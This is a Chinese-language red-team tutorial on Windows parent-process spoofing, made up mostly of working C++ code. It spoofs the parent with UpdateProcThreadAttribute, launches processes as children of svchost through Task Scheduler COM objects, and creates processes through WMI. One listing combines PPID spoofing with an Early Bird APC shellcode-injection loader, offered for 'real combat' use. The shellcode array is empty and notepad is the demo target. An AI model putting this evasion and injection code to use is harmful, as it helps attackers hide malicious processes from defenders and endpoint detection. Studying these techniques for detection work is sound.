# PPID Spoofing

PPID欺骗指的是在计算机系统中伪造父进程ID（Process ID）的行为。进程ID是操作系统为每个正在运行的进程分配的唯一标识符，用于管理和跟踪进程。伪造PPID的目的是欺骗系统或其他进程，使其认为某个进程是由另一个进程创建的，从而隐藏其真实来源或绕过安全检查。

#### 核心函数

**UpdateProcThreadAttribute**

https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

`UpdateProcThreadAttribute`是Windows操作系统提供的一个函数，用于更新正在运行的进程或线程的属性。这个函数通常与`CreateProcess`或`CreateThread`函数结合使用，用于设置进程或线程的特定属性。

```c++
BOOL UpdateProcThreadAttribute(
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  DWORD                         dwFlags,
  DWORD_PTR                     Attribute,
  PVOID                         lpValue,
  SIZE_T                        cbSize,
  PVOID                         lpPreviousValue,
  PSIZE_T                       lpReturnSize
);
```

参数说明：

- `lpAttributeList`：指向`PROC_THREAD_ATTRIBUTE_LIST`结构的指针，该结构包含了要更新的进程或线程的属性列表。
- `dwFlags`：更新属性的标志，目前必须为0。
- `Attribute`：要更新的属性类型，可以是一个常量，如`PROC_THREAD_ATTRIBUTE_HANDLE_LIST`。
- `lpValue`：指向新属性值的指针。
- `cbSize`：`lpValue`指向的数据的大小，以字节为单位。
- `lpPreviousValue`：指向之前属性值的指针，如果不需要可以设置为NULL。
- `lpReturnSize`：指向一个`SIZE_T`变量的指针，用于接收函数返回的属性值的大小。



**CreateProcessA**

https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

`CreateProcessA` 是 Windows 操作系统提供的一个函数，用于创建一个新的进程或线程。

```c++
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

- `lpApplicationName`：可执行文件的名称。如果此参数为 NULL，则命令行参数在括号中指定的程序名称会被当作可执行文件名。`lpCommandLine` 参数不应包含路径信息；当 `lpApplicationName` 参数指定可执行文件的路径时， `lpCommandLine` 参数应包含应用程序的文件名部分（如，cmd.exe）。如果命令行字符串引用了带空格的路径名，则该字符串必须用引号括起来。
- `lpCommandLine`：命令行参数字符串。命令行字符串可以包含应用程序名称、命令行参数以及任何必要的引号。在这个参数中指定的字符串被传递给正在创建的进程。如果 `lpApplicationName` 参数为空，模块名的第一个字符串将被用来指定可执行模块的名称。
- `lpProcessAttributes`：进程句柄的安全属性（一般设置为 `NULL`）。
- `lpThreadAttributes`：线程句柄的安全属性（一般设置为 `NULL`）。
- `bInheritHandles`：指定新进程是否从调用进程继承句柄。
- `dwCreationFlags`：控制进程的创建方式，例如是否为新进程创建一个新的控制台窗口，以及新进程的优先级等。
- `lpEnvironment`：指定环境块的指针。这些变量用于新进程的环境块。如果此参数为 `NULL`，则新进程使用调用进程的环境。
- `lpCurrentDirectory`：字符串指针，指定新进程的当前目录。如果此参数为空，新进程使用与调用进程相同的当前目录。
- `lpStartupInfo`：指向一个 `STARTUPINFO` 结构的指针，该结构指定了新进程的主窗口特性。
- `lpProcessInformation`：指向一个 `PROCESS_INFORMATION` 结构的指针，该结构返回新进程的标识信息。



#### 实现逻辑

以下步骤总结了执行 PPID 欺骗所需的操作。

1. `CreateProcessA`使用`EXTENDED_STARTUPINFO_PRESENT`标志调用以提供对创建的进程的进一步控制。
2. 创建的结构`STARTUPINFOEXA`包含属性列表`LPPROC_THREAD_ATTRIBUTE_LIST`。
3. `InitializeProcThreadAttributeList`被调用来初始化属性列表。该函数必须调用两次，第一次确定属性列表的大小，下一次调用执行初始化。
4. `UpdateProcThreadAttribute`用于通过设置`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`允许用户指定线程的父进程的标志来更新属性。



#### 代码示例

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>

// 获取目标进程pid
DWORD GetPidByName(const char * pName) {
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &pEntry) == TRUE) {
        while (Process32Next(snapshot, &pEntry) == TRUE) {
            if (_stricmp(pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

int main(void) {  
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // 初始化STARTUPINFOEX结构体
    STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;
    DWORD dwPid = 0;

    // 获取指定进程的PID
    dwPid = GetPidByName("explorer.exe");
    if (dwPid == 0)
        dwPid = GetCurrentProcessId();

    // 初始化进程线程属性列表
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    // 打开指定PID的进程句柄
    hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    // 更新进程线程属性，伪造父进程
    UpdateProcThreadAttribute(pAttributeList,
                                0,
                                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                &hParentProcess,
                                sizeof(HANDLE),
                                NULL,
                                NULL);

    info.lpAttributeList = pAttributeList;

    // 创建新的进程，使其具有不同的父进程
    CreateProcessA(NULL,
                    (LPSTR) "notepad.exe",
                    NULL,
                    NULL,
                    FALSE,
                    EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    NULL,
                    &info.StartupInfo,
                    &processInfo);

    // 等待一段时间以查看父子关系
    Sleep(30000);

    // 清理资源
    DeleteProcThreadAttributeList(pAttributeList);
    CloseHandle(hParentProcess);

    return 0;
}

```

通过以上代码进行实验可以看到，notepad.exe的父进程变成了explorer.exe

在实战中可以配合进程注入进行利用，创建一个进程修改其父进程并将shellcode注入到此进程中。但是通常进程注入很容易会被检测到，所以这里先提供一份基本的实现代码。

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>

// 获取目标进程pid
DWORD GetPidByName(const char * pName) {
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &pEntry) == TRUE) {
        while (Process32Next(snapshot, &pEntry) == TRUE) {
            if (_stricmp(pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

int main(void) {  
  	unsigned char shellcode[] = "";
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // 初始化STARTUPINFOEX结构体
    STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;
    DWORD dwPid = 0;

    // 获取指定进程的PID
    dwPid = GetPidByName("explorer.exe");
    if (dwPid == 0)
        dwPid = GetCurrentProcessId();

    // 初始化进程线程属性列表
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    // 打开指定PID的进程句柄
    hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    // 更新进程线程属性，伪造父进程
    UpdateProcThreadAttribute(pAttributeList,
                                0,
                                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                &hParentProcess,
                                sizeof(HANDLE),
                                NULL,
                                NULL);

    info.lpAttributeList = pAttributeList;

    // 创建新的进程，使其具有不同的父进程
    CreateProcessA(NULL,
                    (LPSTR) "notepad.exe",
                    NULL,
                    NULL,
                    FALSE,
                    EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    NULL,
                    &info.StartupInfo,
                    &processInfo);

    // Early Bird APC注入
		LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(processInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(processInfo.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
		QueueUserAPC((PAPCFUNC)lpBaseAddress, processInfo.hThread, NULL);
		ResumeThread(processInfo.hThread);
    // 清理资源
    DeleteProcThreadAttributeList(pAttributeList);
    CloseHandle(hParentProcess);

    return 0;
}

```



# Changing Parents Scheduler

利用task scheduler运行程序，使其成为svchost的子进程。

这里需要利用COM接口进行调用。

COM（Component Object Model）接口是一种用于在Windows操作系统中实现组件之间通信的技术。COM接口允许不同的软件组件在不同的进程中进行通信，无论它们是用什么编程语言编写的。COM接口是面向对象的，它将数据和方法封装在一起，并且提供了一种标准的方式来访问这些数据和方法。

COM就是用于完成特定功能的一些DLL，调用COM接口会引入这些DLL。

Task scheduler com object属于mstask.dll

```C++
#include <windows.h>
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <objidl.h>
#include <wchar.h>
#include <stdio.h>

#pragma comment (lib, "ole32")

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(int argc, char **argv) {
	HRESULT hr = S_OK;
	ITaskScheduler *pITS;

	printf("Let's start a dance!\n"); getchar();
	
	// initialize COM library
	hr = CoInitialize(NULL);

	printf("COM initialized.\n"); getchar();

	if (SUCCEEDED(hr)) {
		// get Task Scheduler object
		hr = CoCreateInstance(CLSID_CTaskScheduler,
							   NULL,
							   CLSCTX_INPROC_SERVER,
							   IID_ITaskScheduler,
							   (void **) &pITS);
		if (FAILED(hr)) {
			CoUninitialize();
			return 1;
		}
	}
	else 
		return 1;

	printf("Task Scheduler object is up.\n"); getchar();

	LPCWSTR pwszTaskName;
	ITask *pITask;
	IPersistFile *pIPersistFile;
	pwszTaskName = L"ExecME";

	// create new task
	hr = pITS->NewWorkItem(pwszTaskName,        // Name of task
						 CLSID_CTask,           // Class identifier 
						 IID_ITask,             // Interface identifier
						 (IUnknown**) &pITask); // Address of task 
	if (FAILED(hr)) {
		CoUninitialize();
		printf("Failed calling NewWorkItem, error = 0x%x\n", hr);
		return 1;
	}

	// set task parameters: comment, name, working directory, params
	pITask->SetComment(L"C'mon! Notepad is legit!");
	pITask->SetApplicationName(L"C:\\Windows\\System32\\notepad.exe");
	pITask->SetWorkingDirectory(L"C:\\Windows\\System32");
	pITask->SetParameters(L"c:\\rto\\boom.txt");
	pITask->SetAccountInformation(L"rto", NULL);  

	// set Flags
	pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
	//pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON | TASK_FLAG_HIDDEN);  // hidden flag set on .job file

	// get a pointer to IPersistFile
	hr = pITask->QueryInterface(IID_IPersistFile,
							  (void **) &pIPersistFile);

	if (FAILED(hr))	{
		CoUninitialize();
		printf("Failed calling QueryInterface, error = 0x%x\n", hr);
		return 1;
	}

	// save the new task to disk
	hr = pIPersistFile->Save(NULL, TRUE);
	pIPersistFile->Release();
	
	if (FAILED(hr)) {
		CoUninitialize();
		printf("Failed calling Save, error = 0x%x\n", hr);
		return 1;
	}

	printf("Created task.\n");

	// run the task
	hr = pITask->Run();
	pITask->Release();

	if (FAILED(hr)) {
		printf("Failed calling ITask::Run, error = 0x%x\n", hr);
		CoUninitialize();
		return 1;
	}  
	printf("Task ran.\n");

	printf("Check C:\\Windows\\Tasks folder\n"); getchar();

	// and remove the task
	pITS->Delete(pwszTaskName);
	pITS->Release();                               // Release object
	printf("Task removed\n");

	// clean up
	CoUninitialize();
	
	printf("Go HOME!\n"); getchar();
	return 0;
}

```



# Changing Parents via wmi

WMI（Windows Management Instrumentation）是微软Windows操作系统中的一种管理框架，用于管理和监视系统的各种元素，如硬件、软件、网络等。它提供了一种标准的接口，允许开发人员和系统管理员通过编程方式访问和控制Windows操作系统的各种功能和资源。

wmi功能十分强大，经常用于信息搜集和横向移动，这里不展开介绍。

使用wmi创建进程

```cmd
wmic process call create "notepad.exe"
```



代码实现：

同样是使用COM接口。

```c++
#define _WIN32_DCOM
#include <comdef.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(int argc, char ** argv) {
    HRESULT hres;

    // initialize COM library
    hres =  CoInitializeEx(0, COINIT_MULTITHREADED); 
    if (FAILED(hres)) {
		printf("Failed to initialize COM library. Error code = 0x%x\n", hres);
        return 1;
    }

    // set COM security levels
    hres =  CoInitializeSecurity(
								NULL, 
								-1,                          // COM negotiates service
								NULL,                        // Authentication services
								NULL,                        // Reserved
								RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
								RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
								NULL,                        // Authentication info
								EOAC_NONE,                   // Additional capabilities 
								NULL                         // Reserved
								);

    if (FAILED(hres)) {
		printf("Failed to initialize security. Error code = 0x%x\n", hres);
        CoUninitialize();
        return 1;
    }

    // get the initial locator to WMI
    IWbemLocator * pLoc = NULL;
    hres = CoCreateInstance(
							CLSID_WbemLocator,
							0, 
							CLSCTX_INPROC_SERVER, 
							IID_IWbemLocator, (LPVOID *) &pLoc);
 
    if (FAILED(hres)) {
		printf("Failed to create IWbemLocator object. Error code = 0x%x\n", hres);
        CoUninitialize();
        return 1;
    }

    // connect to the local root\cimv2 namespace
    // and obtain pointer pSvc to make IWbemServices calls.
    IWbemServices * pSvc = NULL;
    hres = pLoc->ConnectServer(
							_bstr_t(L"ROOT\\CIMV2"), 
							NULL,
							NULL, 
							0, 
							NULL, 
							0, 
							0, 
							&pSvc
							);

    if (FAILED(hres)) {
		printf("Could not connect. Error code = 0x%x\n", hres);
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

	printf("Connected to ROOT\\CIMV2 WMI namespace\n");

    // set security levels for the proxy
    hres = CoSetProxyBlanket(
							pSvc,                        // Indicates the proxy to set
							RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx 
							RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx 
							NULL,                        // Server principal name 
							RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
							RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
							NULL,                        // client identity
							EOAC_NONE                    // proxy capabilities 
							);

    if (FAILED(hres)) {
		printf("Could not set proxy blanket. Error code = 0x%x\n", hres);
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    // use the IWbemServices pointer to make requests of WMI
    // set up to call the Win32_Process::Create method
    BSTR ClassName = SysAllocString(L"Win32_Process");
    BSTR MethodName = SysAllocString(L"Create");

    IWbemClassObject * pClass = NULL;
    hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);

    IWbemClassObject * pInParamsDefinition = NULL;
    hres = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);

    IWbemClassObject * pClassInstance = NULL;
    hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);

    // create the values for the in parameters
    VARIANT varCommand;
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(L"notepad.exe c:\\rto\\boom.txt");

    // store the value for the in parameters
    hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);
    wprintf(L"The command is: %s\n", V_BSTR(&varCommand));

	
    // and finally - execute method
    IWbemClassObject * pOutParams = NULL;
    hres = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);

    if (FAILED(hres)) {
		printf("Could not execute method. Error code = 0x%x\n", hres);
        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClass->Release();
        pClassInstance->Release();
        pInParamsDefinition->Release();
        pOutParams->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    // To see what the method returned,
    // use the following code.  The return value will
    // be in &varReturnValue
    VARIANT varReturnValue;
    hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, 0);

	wprintf(L"Return value: %s\n", V_BSTR(&varReturnValue));

    // clean up
    VariantClear(&varCommand);
    VariantClear(&varReturnValue);
    SysFreeString(ClassName);
    SysFreeString(MethodName);
    pClass->Release();
    pClassInstance->Release();
    pInParamsDefinition->Release();
    pOutParams->Release();
    pLoc->Release();
    pSvc->Release();
    CoUninitialize();
    return 0;
}

```

